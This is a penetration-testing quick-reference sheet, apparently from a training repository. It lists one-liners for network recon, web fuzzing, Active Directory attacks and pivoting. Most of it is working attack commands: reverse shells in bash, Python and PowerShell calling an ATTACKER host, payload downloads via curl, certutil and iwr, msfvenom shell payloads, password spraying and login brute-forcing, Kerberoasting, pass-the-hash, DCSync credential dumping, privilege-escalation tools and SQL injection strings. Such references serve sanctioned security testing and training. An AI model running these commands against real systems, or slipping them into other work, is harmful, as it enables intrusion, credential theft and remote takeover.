# Quick Commands

Cross-phase one-liners for fast lookup. Each entry links back to its detailed module.

## Recon

```bash
# Full TCP sweep, fast — see [10 Nmap]
sudo nmap -p- --min-rate 5000 -oA stage1 <T>
ports=$(awk -F'[ /]' '/Ports:/ {for (i=1;i<=NF;i++) if ($i~/open/) print $(i-3)}' stage1.gnmap | sort -un | paste -sd,)
sudo nmap -sCV -O -p$ports -oA stage2 <T>

# UDP top 100
sudo nmap -sU --top-ports 100 -sV --version-intensity 0 -oA udp <T>

# Subdomain enum (passive + active)
subfinder -d <DOMAIN> -all -recursive -o subs.txt
amass enum -passive -d <DOMAIN> -silent >> subs.txt
puredns resolve subs.txt -r resolvers.txt -w live-dns.txt
httpx -l live-dns.txt -title -tech-detect -status-code -o live-http.txt

# crt.sh subs
curl -s "https://crt.sh/?q=%25.<DOMAIN>&output=json" | jq -r '.[].name_value' | sort -u
```

## Web fuzzing

```bash
# Directory
ffuf -u https://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc all -fc 404

# Vhost
ffuf -u http://<IP>/ -H "Host: FUZZ.<DOMAIN>" -w subs.txt -fs <baseline-size>

# Parameter discovery
arjun -u 'https://target/page' --get -m GET

# Login brute on form
ffuf -u https://target/login -X POST -d 'username=admin&password=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' -w passwords.txt -fr 'Invalid'
```

## SMB / AD initial

```bash
# Banner / null session
netexec smb <T>
netexec smb <T> -u '' -p '' --shares
rpcclient -U "" -N <T>

# Username enumeration (no lockout)
kerbrute userenum -d <DOMAIN> --dc <DC> users.txt

# Spray (ALWAYS read pwd-pol first)
netexec smb <DC> -u alice -p Pass1 --pass-pol
kerbrute passwordspray -d <DOMAIN> --dc <DC> users.txt 'Spring2025!'

# Initial AD enum from a credential
bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -c All -ns <DC> --zip
netexec smb <DC> -u <USER> -p <PASS> --users --groups --pass-pol --shares
```

## AD attacks (quick recipes)

```bash
# Kerberoast
impacket-GetUserSPNs -request -dc-ip <DC> <DOMAIN>/<USER>:<PASS> -outputfile kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule

# AS-REP roast
impacket-GetNPUsers -dc-ip <DC> -request <DOMAIN>/<USER>:<PASS> -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule

# Pass-the-hash
netexec smb <T> -u Administrator -H <NThash>
evil-winrm -i <T> -u Administrator -H <NThash>
xfreerdp /u:Administrator /pth:<NThash> /v:<T>

# DCSync (with appropriate rights)
impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>:<PASS>@<DC>

# NTLM coerce → relay
impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks
PetitPotam.py -u '' -p '' <ATTACKER-IP> <DC>

# ADCS triage
certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC> -vulnerable -enabled
```

## File transfers

```bash
# Attacker
python3 -m http.server 80
impacket-smbserver share /tmp/share -smb2support
```

```bash
# Linux target
curl -o /tmp/f http://attacker/f
wget -O /tmp/f http://attacker/f
```

```cmd
:: Windows target
certutil -urlcache -split -f http://attacker/f.exe C:\Temp\f.exe
powershell iwr http://attacker/f.exe -OutFile C:\Temp\f.exe -UseBasicParsing
copy \\attacker\share\f.exe C:\Temp\f.exe
```

## Reverse shells

```bash
# Listener
rlwrap nc -lvnp 4444

# Linux callback
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# Windows callback (PowerShell, condensed)
$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1 | Out-String);$ob=([Text.Encoding]::ASCII).GetBytes($o + 'PS> ');$s.Write($ob,0,$ob.Length);$s.Flush()};$c.Close()
```

```bash
# msfvenom payloads
msfvenom -p linux/x64/shell_reverse_tcp LHOST=A LPORT=4444 -f elf -o sh.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=A LPORT=4444 -f exe -o sh.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=A LPORT=4444 -f exe -o m.exe
msfvenom -p php/reverse_php LHOST=A LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=A LPORT=4444 -f raw -o shell.jsp
```

## Stabilizing a Linux shell

```bash
# Inside the shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
# ^Z (background)
# Attacker:
stty raw -echo; fg
# Enter, Enter
reset
stty rows 50 cols 200
```

## Pivoting / tunneling

```bash
# SSH dynamic SOCKS
ssh -N -D 1080 user@pivot
proxychains -q nmap -sT -Pn -p 22,80,445 10.0.0.0/24

# sshuttle (full layer 3)
sshuttle -r user@pivot 10.0.0.0/24

# chisel reverse SOCKS
./chisel server -p 8080 --reverse --auth u:p
./chisel client --auth u:p http://attacker:8080 R:1080:socks

# ligolo-ng (TUN — supports raw nmap)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
./agent -connect attacker:11601 -ignore-cert
```

## Privilege escalation

### Linux

```bash
# Enum
curl -sL .../linpeas.sh | sh
./pspy64

# Sudo
sudo -l

# SUID
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null
```

### Windows

```cmd
:: Enum
winPEASx64.exe quiet
whoami /priv
whoami /all

:: SeImpersonate → SYSTEM
PrintSpoofer.exe -i -c cmd
GodPotato -cmd "cmd /c whoami"

:: AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: If both are 0x1:
msiexec /quiet /qn /i C:\Temp\evil.msi
```

## Hash cracking

```bash
# Identify
hashcat --identify '<hash>'
hashid '<hash>'

# Attack patterns
hashcat -m <mode> hashes.txt rockyou.txt
hashcat -m <mode> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <mode> -a 3 hashes.txt ?u?l?l?l?l?l?d?d
hashcat -m <mode> hashes.txt --show
```

| Type | Mode |
|---|---|
| MD5 | 0 |
| SHA-256 | 1400 |
| SHA-512 | 1700 |
| NTLM | 1000 |
| NetNTLMv2 | 5600 |
| Kerberoast | 13100 |
| AS-REP | 18200 |
| bcrypt | 3200 |
| sha512crypt | 1800 |
| WPA(2) | 22000 |

## SQL injection (manual)

```sql
' OR 1=1--
' UNION SELECT NULL,NULL--                          -- column count
' UNION SELECT @@version,NULL--                       -- DBMS-specific
' AND IF(SUBSTRING((SELECT user()),1,1)='r',SLEEP(5),0)--   -- MySQL time-blind
'; WAITFOR DELAY '0:0:5'--                            -- MSSQL time-blind
'; SELECT pg_sleep(5)--                                -- Postgres time-blind
```

## Reporting

```bash
# Capture terminal session
script -t 2> session.tim session.log
# ... do stuff ...
exit
scriptreplay session.tim session.log

# Hash files for evidence
sha256sum *
```

## See also

- [10 Nmap](../modules/10-network-enumeration-with-nmap.md) for full nmap reference
- [15 Shells & Payloads](../modules/15-shells-and-payloads.md) for full reverse shell catalog
- [17 Password Attacks](../modules/17-password-attacks.md) for full hashcat / john reference
- [20 AD Attacks](../modules/20-active-directory-attacks.md) for full AD attack reference
- [32 Linux Privesc](../modules/32-linux-privilege-escalation.md), [33 Windows Privesc](../modules/33-windows-privilege-escalation.md)
- [35 Enterprise Methodology](../modules/35-attacking-enterprise-networks.md) for the full chain
